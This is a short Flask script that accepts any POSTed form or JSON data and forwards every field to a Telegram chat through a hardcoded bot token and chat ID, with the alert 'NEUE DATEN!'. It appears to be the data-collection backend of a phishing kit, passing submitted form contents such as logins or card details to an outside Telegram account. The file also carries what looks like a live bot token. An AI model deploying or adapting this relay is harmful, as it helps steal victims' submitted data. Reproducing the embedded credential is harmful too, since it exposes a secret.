from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = "8999243130:AAE3dBaylqJxM3BiXaCFQs9SXoi8V1EJ2qY"
CHAT_ID = "-1003980397965"

def send_to_telegram(data):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = "🔴 <b>NEUE DATEN!</b>\n\n"
    for key, value in data.items():
        message += f"<b>{key}</b>: {value}\n"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Ошибка: {e}")

@app.route("/", methods=["POST"])
def handle_post():
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form.to_dict()
    send_to_telegram(data)
    return "OK", 200

# ============================================================
# 🔥 ЭТОТ МАРШРУТ НУЖЕН ДЛЯ HEALTH CHECK — ДОБАВЬ ЕГО!
# ============================================================
@app.route("/health", methods=["GET"])
def health():
    return "OK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
